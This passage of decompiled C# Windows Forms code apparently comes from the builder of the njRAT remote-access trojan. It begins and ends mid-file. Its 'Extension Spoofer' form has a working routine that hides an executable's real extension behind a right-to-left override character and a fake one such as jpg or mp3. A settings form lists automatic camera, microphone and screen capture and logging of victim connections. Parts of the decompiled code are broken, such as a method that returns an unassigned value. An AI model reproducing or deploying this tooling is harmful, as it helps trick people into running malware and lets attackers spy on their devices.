					this._Box1.Click += value2;
				}
			}
		}

		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click_2);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click_2);
				bool flag = this._Button2 != null;
				if (flag)
				{
					this._Button2.Click -= value2;
				}
				this._Button2 = value;
				flag = (this._Button2 != null);
				if (flag)
				{
					this._Button2.Click += value2;
				}
			}
		}

		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		internal virtual LogInRichTextBox LogIox5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogIox5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogIox5 = value;
			}
		}

		internal virtual LogInRichTextBox LogInRichTextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInRichTextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInRichTextBox1 = value;
			}
		}

		internal virtual Button Button4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button4_Click);
				bool flag = this._Button4 != null;
				if (flag)
				{
					this._Button4.Click -= value2;
				}
				this._Button4 = value;
				flag = (this._Button4 != null);
				if (flag)
				{
					this._Button4.Click += value2;
				}
			}
		}

		internal virtual Button Button5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Button5 = value;
			}
		}

		internal virtual Button Button3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button3_Click);
				bool flag = this._Button3 != null;
				if (flag)
				{
					this._Button3.Click -= value2;
				}
				this._Button3 = value;
				flag = (this._Button3 != null);
				if (flag)
				{
					this._Button3.Click += value2;
				}
			}
		}

		internal virtual Button Button6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Button6 = value;
			}
		}

		internal virtual Button Button7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Button7 = value;
			}
		}

		internal virtual Button Button8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Button8 = value;
			}
		}

		internal virtual Button Button9
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button9;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Button9 = value;
			}
		}

		internal virtual LogInComboBox ComboBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComboBox1 = value;
			}
		}

		public spoofer()
		{
			base.Load += new EventHandler(this.spoofer_Load);
			spoofer.__ENCAddToList(this);
			this.OpenFileDialog = new OpenFileDialog();
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = spoofer.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = spoofer.__ENCList.Count == spoofer.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = spoofer.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = spoofer.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									spoofer.__ENCList[num] = spoofer.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						spoofer.__ENCList.RemoveRange(num, spoofer.__ENCList.Count - num);
						spoofer.__ENCList.Capacity = spoofer.__ENCList.Count;
					}
					spoofer.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(spoofer));
			this.Button1 = new Button();
			this.Button2 = new Button();
			this.Label1 = new Label();
			this.Button4 = new Button();
			this.Button5 = new Button();
			this.Button3 = new Button();
			this.Button6 = new Button();
			this.Button7 = new Button();
			this.Button8 = new Button();
			this.Button9 = new Button();
			this.ComboBox1 = new LogInComboBox();
			this.LogInRichTextBox1 = new LogInRichTextBox();
			this.LogIox5 = new LogInRichTextBox();
			this.Box1 = new LogInTitledListBox();
			this.SuspendLayout();
			this.Button1.BackColor = Color.FromArgb(55, 55, 55);
			this.Button1.FlatStyle = FlatStyle.Flat;
			this.Button1.ForeColor = Color.LightSteelBlue;
			Control arg_10B_0 = this.Button1;
			Point location = new Point(60, 170);
			arg_10B_0.Location = location;
			this.Button1.Name = "Button1";
			Control arg_139_0 = this.Button1;
			Size size = new Size(306, 25);
			arg_139_0.Size = size;
			this.Button1.TabIndex = 55;
			this.Button1.Text = "Spoofer";
			this.Button1.UseVisualStyleBackColor = false;
			this.Button2.BackColor = Color.FromArgb(55, 55, 55);
			this.Button2.FlatStyle = FlatStyle.Flat;
			this.Button2.ForeColor = Color.LightSteelBlue;
			Control arg_1B9_0 = this.Button2;
			location = new Point(409, 170);
			arg_1B9_0.Location = location;
			this.Button2.Name = "Button2";
			Control arg_1E4_0 = this.Button2;
			size = new Size(93, 26);
			arg_1E4_0.Size = size;
			this.Button2.TabIndex = 54;
			this.Button2.Text = "Files";
			this.Button2.UseVisualStyleBackColor = false;
			this.Label1.AutoSize = true;
			this.Label1.BackColor = Color.FromArgb(22, 22, 22);
			this.Label1.ForeColor = Color.LightSteelBlue;
			Control arg_264_0 = this.Label1;
			location = new Point(674, 149);
			arg_264_0.Location = location;
			this.Label1.Name = "Label1";
			Control arg_28F_0 = this.Label1;
			size = new Size(42, 13);
			arg_28F_0.Size = size;
			this.Label1.TabIndex = 53;
			this.Label1.Text = "Browse";
			this.Button4.BackColor = Color.FromArgb(54, 54, 54);
			this.Button4.FlatStyle = FlatStyle.Flat;
			this.Button4.Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.Button4.ForeColor = Color.Black;
			Control arg_31D_0 = this.Button4;
			location = new Point(298, 12);
			arg_31D_0.Location = location;
			this.Button4.Name = "Button4";
			Control arg_348_0 = this.Button4;
			size = new Size(94, 23);
			arg_348_0.Size = size;
			this.Button4.TabIndex = 118;
			this.Button4.Text = "Select Exe";
			this.Button4.UseVisualStyleBackColor = false;
			this.Button5.BackColor = Color.FromArgb(54, 54, 54);
			this.Button5.FlatStyle = FlatStyle.Flat;
			this.Button5.Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.Button5.ForeColor = Color.Black;
			Control arg_3E3_0 = this.Button5;
			location = new Point(298, 53);
			arg_3E3_0.Location = location;
			this.Button5.Name = "Button5";
			Control arg_40E_0 = this.Button5;
			size = new Size(94, 23);
			arg_40E_0.Size = size;
			this.Button5.TabIndex = 119;
			this.Button5.Text = "Browse";
			this.Button5.UseVisualStyleBackColor = false;
			this.Button3.BackColor = Color.FromArgb(54, 54, 54);
			this.Button3.FlatStyle = FlatStyle.Flat;
			this.Button3.Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.Button3.ForeColor = Color.Black;
			Control arg_4A9_0 = this.Button3;
			location = new Point(298, 79);
			arg_4A9_0.Location = location;
			this.Button3.Name = "Button3";
			Control arg_4D4_0 = this.Button3;
			size = new Size(94, 23);
			arg_4D4_0.Size = size;
			this.Button3.TabIndex = 120;
			this.Button3.Text = "Change";
			this.Button3.UseVisualStyleBackColor = false;
			this.Button6.BackColor = Color.FromArgb(54, 54, 54);
			this.Button6.FlatStyle = FlatStyle.Flat;
			this.Button6.ForeColor = Color.Black;
			this.Button6.Image = (Image)componentResourceManager.GetObject("Button6.Image");
			Control arg_56D_0 = this.Button6;
			location = new Point(275, 12);
			arg_56D_0.Location = location;
			this.Button6.Name = "Button6";
			Control arg_598_0 = this.Button6;
			size = new Size(29, 23);
			arg_598_0.Size = size;
			this.Button6.TabIndex = 121;
			this.Button6.Text = ".";
			this.Button6.UseVisualStyleBackColor = false;
			this.Button7.BackColor = Color.FromArgb(54, 54, 54);
			this.Button7.FlatStyle = FlatStyle.Flat;
			this.Button7.ForeColor = Color.Black;
			this.Button7.Image = (Image)componentResourceManager.GetObject("Button7.Image");
			Control arg_631_0 = this.Button7;
			location = new Point(603, 59);
			arg_631_0.Location = location;
			this.Button7.Name = "Button7";
			Control arg_65C_0 = this.Button7;
			size = new Size(29, 23);
			arg_65C_0.Size = size;
			this.Button7.TabIndex = 122;
			this.Button7.Text = ".";
			this.Button7.UseVisualStyleBackColor = false;
			this.Button8.BackColor = Color.FromArgb(54, 54, 54);
			this.Button8.FlatStyle = FlatStyle.Flat;
			this.Button8.ForeColor = Color.Black;
			this.Button8.Image = (Image)componentResourceManager.GetObject("Button8.Image");
			Control arg_6F5_0 = this.Button8;
			location = new Point(275, 54);
			arg_6F5_0.Location = location;
			this.Button8.Name = "Button8";
			Control arg_720_0 = this.Button8;
			size = new Size(29, 22);
			arg_720_0.Size = size;
			this.Button8.TabIndex = 126;
			this.Button8.Text = ".";
			this.Button8.UseVisualStyleBackColor = false;
			this.Button9.BackColor = Color.FromArgb(54, 54, 54);
			this.Button9.FlatStyle = FlatStyle.Flat;
			this.Button9.ForeColor = Color.Black;
			this.Button9.Image = (Image)componentResourceManager.GetObject("Button9.Image");
			Control arg_7B9_0 = this.Button9;
			location = new Point(275, 79);
			arg_7B9_0.Location = location;
			this.Button9.Name = "Button9";
			Control arg_7E4_0 = this.Button9;
			size = new Size(29, 23);
			arg_7E4_0.Size = size;
			this.Button9.TabIndex = 127;
			this.Button9.Text = ".";
			this.Button9.UseVisualStyleBackColor = false;
			this.ComboBox1.ArrowColour = Color.DimGray;
			this.ComboBox1.BackColor = Color.Transparent;
			this.ComboBox1.BaseColour = Color.FromArgb(54, 54, 54);
			this.ComboBox1.BorderColour = Color.White;
			this.ComboBox1.DrawMode = DrawMode.OwnerDrawFixed;
			this.ComboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
			this.ComboBox1.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.ComboBox1.FontColour = Color.LightSteelBlue;
			this.ComboBox1.FormattingEnabled = true;
			this.ComboBox1.Items.AddRange(new object[]
			{
				". jpg",
				". scr",
				". mp3",
				". wav",
				". txt",
				". mp4",
				".Ico",
				". jpg",
				". gif",
				". bat",
				". vbs",
				". html",
				"."
			});
			this.ComboBox1.LineColour = Color.FromArgb(55, 55, 55);
			Control arg_982_0 = this.ComboBox1;
			location = new Point(28, 69);
			arg_982_0.Location = location;
			this.ComboBox1.Name = "ComboBox1";
			Control arg_9B0_0 = this.ComboBox1;
			size = new Size(231, 23);
			arg_9B0_0.Size = size;
			this.ComboBox1.SqaureColour = Color.FromArgb(47, 47, 47);
			this.ComboBox1.SqaureHoverColour = Color.FromArgb(52, 52, 52);
			this.ComboBox1.StartIndex = 0;
			this.ComboBox1.TabIndex = 128;
			this.LogInRichTextBox1.BackColor = Color.FromArgb(54, 54, 54);
			this.LogInRichTextBox1.BaseColour = Color.FromArgb(42, 42, 42);
			this.LogInRichTextBox1.BorderColour = Color.FromArgb(35, 35, 35);
			this.LogInRichTextBox1.ForeColor = Color.LightSteelBlue;
			Control arg_A6B_0 = this.LogInRichTextBox1;
			location = new Point(12, 54);
			arg_A6B_0.Location = location;
			this.LogInRichTextBox1.Name = "LogInRichTextBox1";
			Control arg_A99_0 = this.LogInRichTextBox1;
			size = new Size(257, 55);
			arg_A99_0.Size = size;
			this.LogInRichTextBox1.TabIndex = 73;
			this.LogInRichTextBox1.TextColour = Color.FromArgb(255, 255, 255);
			this.LogIox5.BackColor = Color.FromArgb(54, 54, 54);
			this.LogIox5.BaseColour = Color.FromArgb(42, 42, 42);
			this.LogIox5.BorderColour = Color.FromArgb(35, 35, 35);
			this.LogIox5.ForeColor = Color.LightSteelBlue;
			Control arg_B36_0 = this.LogIox5;
			location = new Point(12, 12);
			arg_B36_0.Location = location;
			this.LogIox5.Name = "LogIox5";
			Control arg_B64_0 = this.LogIox5;
			size = new Size(257, 51);
			arg_B64_0.Size = size;
			this.LogIox5.TabIndex = 72;
			this.LogIox5.TextColour = Color.FromArgb(255, 255, 255);
			this.Box1.BaseColour = Color.FromArgb(42, 42, 42);
			this.Box1.BorderColour = Color.FromArgb(35, 35, 35);
			this.Box1.Items = new string[]
			{
				""
			};
			this.Box1.ListBaseColour = Color.FromArgb(47, 47, 47);
			Control arg_C0F_0 = this.Box1;
			location = new Point(0, -41);
			arg_C0F_0.Location = location;
			this.Box1.Name = "Box1";
			this.Box1.SelectedColour = Color.FromArgb(55, 55, 55);
			Control arg_C57_0 = this.Box1;
			size = new Size(403, 160);
			arg_C57_0.Size = size;
			this.Box1.TabIndex = 51;
			this.Box1.Text = "Spoofer";
			this.Box1.TextColour = Color.FromArgb(255, 255, 255);
			this.Box1.TitleFont = new Font("Microsoft Sans Serif", 10f, FontStyle.Bold);
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			size = new Size(398, 114);
			this.ClientSize = size;
			this.Controls.Add(this.ComboBox1);
			this.Controls.Add(this.Button9);
			this.Controls.Add(this.Button8);
			this.Controls.Add(this.Button7);
			this.Controls.Add(this.Button6);
			this.Controls.Add(this.Button3);
			this.Controls.Add(this.Button5);
			this.Controls.Add(this.Button4);
			this.Controls.Add(this.LogInRichTextBox1);
			this.Controls.Add(this.LogIox5);
			this.Controls.Add(this.Button1);
			this.Controls.Add(this.Button2);
			this.Controls.Add(this.Label1);
			this.Controls.Add(this.Box1);
			this.ForeColor = SystemColors.ButtonHighlight;
			this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			size = new Size(414, 148);
			this.MaximumSize = size;
			size = new Size(414, 148);
			this.MinimumSize = size;
			this.Name = "spoofer";
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "Extension Spoofer";
			this.TransparencyKey = Color.Fuchsia;
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		private void Button2_Click(object sender, EventArgs e)
		{
		}

		public void SpoofEx(string File_Sp, string Extension)
		{
			char[] array = Extension.ToCharArray();
			Array.Reverse(array);
			string destFileName = checked(File_Sp.Substring(0, File_Sp.Length - 4) + "‮" + new string(array) + File_Sp.Substring(File_Sp.Length - 4));
			File.Move(File_Sp, destFileName);
		}

		private void Button1_Click(object sender, EventArgs e)
		{
		}

		private void spoofer_Load(object sender, EventArgs e)
		{
			this.Text = "Extension Spoofer: " + Environment.MachineName + "\\@" + Environment.UserName;
			try
			{
				string empty = string.Empty;
				string[] array = Strings.Split(empty, "\r\n", -1, CompareMethod.Binary);
			}
			catch (Exception expr_38)
			{
				ProjectData.SetProjectError(expr_38);
				ProjectData.ClearProjectError();
			}
			checked
			{
				this.Top = Screen.PrimaryScreen.WorkingArea.Height - this.Width - 55;
				this.Left = Screen.PrimaryScreen.WorkingArea.Width - this.Width - 350;
			}
		}

		private void ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		private void Button1_Click_2(object sender, EventArgs e)
		{
		}

		private void Button2_Click_2(object sender, EventArgs e)
		{
		}

		private void Button3_Click(object sender, EventArgs e)
		{
			this.SpoofEx(this.OpenFileDialog.FileName, this.ComboBox1.Text);
			Interaction.MsgBox(" DONE!", MsgBoxStyle.Information, "Extension Spoofer ");
			Interaction.MsgBox("File Builded To\r\n" + this.FileName(), MsgBoxStyle.Information, "DONE!");
			this.Close();
		}

		private void Button4_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = this.OpenFileDialog;
			openFileDialog.Title = "Choose file ...";
			openFileDialog.Filter = "All Files (*.*)|*.*";
			openFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				this.LogIox5.Text = this.OpenFileDialog.FileName;
			}
		}

		private string FileName()
		{
			string result;
			return result;
		}

		private void Box1_Click(object sender, EventArgs e)
		{
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class STNG : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("GroupBox1")]
		private GroupBox _GroupBox1;

		[AccessedThroughProperty("ShowAlert")]
		private CheckBox _ShowAlert;

		[AccessedThroughProperty("GroupBox2")]
		private GroupBox _GroupBox2;

		[AccessedThroughProperty("LOGMSGS")]
		private CheckBox _LOGMSGS;

		[AccessedThroughProperty("LOGRERR")]
		private CheckBox _LOGRERR;

		[AccessedThroughProperty("LOGCONNECTIONS")]
		private CheckBox _LOGCONNECTIONS;

		[AccessedThroughProperty("LOGLERR")]
		private CheckBox _LOGLERR;

		[AccessedThroughProperty("LOGLOGIN")]
		private CheckBox _LOGLOGIN;

		[AccessedThroughProperty("GroupBox3")]
		private GroupBox _GroupBox3;

		[AccessedThroughProperty("SCAUT")]
		private CheckBox _SCAUT;

		[AccessedThroughProperty("SCI")]
		private ComboBox _SCI;

		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		[AccessedThroughProperty("GroupBox4")]
		private GroupBox _GroupBox4;

		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		[AccessedThroughProperty("CAMI")]
		private ComboBox _CAMI;

		[AccessedThroughProperty("CAMAUT")]
		private CheckBox _CAMAUT;

		[AccessedThroughProperty("MICAUT")]
		private CheckBox _MICAUT;

		[AccessedThroughProperty("GroupBox6")]
		private GroupBox _GroupBox6;

		[AccessedThroughProperty("scrI")]
		private ComboBox _scrI;

		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		[AccessedThroughProperty("Isu")]
		private CheckBox _Isu;

		[AccessedThroughProperty("CheckBox1")]
		private CheckBox _CheckBox1;

		[AccessedThroughProperty("CheckBox3")]
		private CheckBox _CheckBox3;

		[AccessedThroughProperty("CheckBox6")]
		private CheckBox _CheckBox6;

		[AccessedThroughProperty("CheckBox7")]
		private CheckBox _CheckBox7;

		[AccessedThroughProperty("CheckBox9")]
		private CheckBox _CheckBox9;

		[AccessedThroughProperty("CheckBox8")]
		private CheckBox _CheckBox8;

		[AccessedThroughProperty("CheckBox2")]
		private CheckBox _CheckBox2;

		[AccessedThroughProperty("CheckBox4")]
		private CheckBox _CheckBox4;

		[AccessedThroughProperty("CheckBox5")]
		private CheckBox _CheckBox5;

		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		[AccessedThroughProperty("LogInComboBox2")]
		private LogInComboBox _LogInComboBox2;

		[AccessedThroughProperty("LogInComboBox1")]
		private LogInComboBox _LogInComboBox1;

		[AccessedThroughProperty("LogInComboBox3")]
		private LogInComboBox _LogInComboBox3;

		[AccessedThroughProperty("LogInComboBox4")]
		private LogInComboBox _LogInComboBox4;

		internal virtual GroupBox GroupBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox1 = value;
			}
		}

		internal virtual CheckBox ShowAlert
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ShowAlert;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ShowAlert = value;
			}
		}

		internal virtual GroupBox GroupBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox2 = value;
			}
		}

		internal virtual CheckBox LOGMSGS
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LOGMSGS;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LOGMSGS = value;
			}
		}

		internal virtual CheckBox LOGRERR
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LOGRERR;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LOGRERR = value;
			}
		}

		internal virtual CheckBox LOGCONNECTIONS
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LOGCONNECTIONS;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LOGCONNECTIONS = value;
			}
		}

		internal virtual CheckBox LOGLERR
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LOGLERR;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LOGLERR = value;
			}
		}

		internal virtual CheckBox LOGLOGIN
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LOGLOGIN;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LOGLOGIN = value;
			}
		}

		internal virtual GroupBox GroupBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox3 = value;
			}
		}

		internal virtual CheckBox SCAUT
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SCAUT;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SCAUT = value;
			}
		}

		internal virtual ComboBox SCI
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SCI;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SCI = value;
			}
		}

		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		internal virtual GroupBox GroupBox4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox4 = value;
			}
		}

		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		internal virtual ComboBox CAMI
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CAMI;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CAMI = value;
			}
		}

		internal virtual CheckBox CAMAUT
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CAMAUT;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CAMAUT = value;
			}
		}

		internal virtual CheckBox MICAUT
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MICAUT;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._MICAUT = value;
			}
		}

		internal virtual GroupBox GroupBox6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox6 = value;
			}
		}

		internal virtual ComboBox scrI
		{
			[DebuggerNonUserCode]
			get
			{
				return this._scrI;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._scrI = value;
			}
		}

		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label3 = value;
			}
		}

		internal virtual CheckBox Isu
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Isu;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Isu = value;
			}
		}

		internal virtual CheckBox CheckBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CheckBox1 = value;
			}
		}

		internal virtual CheckBox CheckBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CheckBox3 = value;
			}
		}

		internal virtual CheckBox CheckBox6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CheckBox6 = value;
			}
		}

		internal virtual CheckBox CheckBox7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CheckBox7 = value;
			}
		}

		internal virtual CheckBox CheckBox9
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox9;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CheckBox9 = value;
			}
		}

		internal virtual CheckBox CheckBox8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CheckBox8 = value;
			}
		}

		internal virtual CheckBox CheckBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CheckBox2 = value;
			}
		}

		internal virtual CheckBox CheckBox4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CheckBox4 = value;
			}
		}

		internal virtual CheckBox CheckBox5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CheckBox5 = value;
			}
		}

		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click_1);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		internal virtual LogInComboBox LogInComboBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInComboBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInComboBox2 = value;
			}
		}

		internal virtual LogInComboBox LogInComboBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInComboBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInComboBox1 = value;
			}
		}

		internal virtual LogInComboBox LogInComboBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInComboBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInComboBox3 = value;
			}
		}

		internal virtual LogInComboBox LogInComboBox4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInComboBox4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInComboBox4 = value;
			}
		}

		[DebuggerNonUserCode]
		public STNG()
		{
			base.Load += new EventHandler(this.STNG_Load);
			STNG.__ENCAddToList(this);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
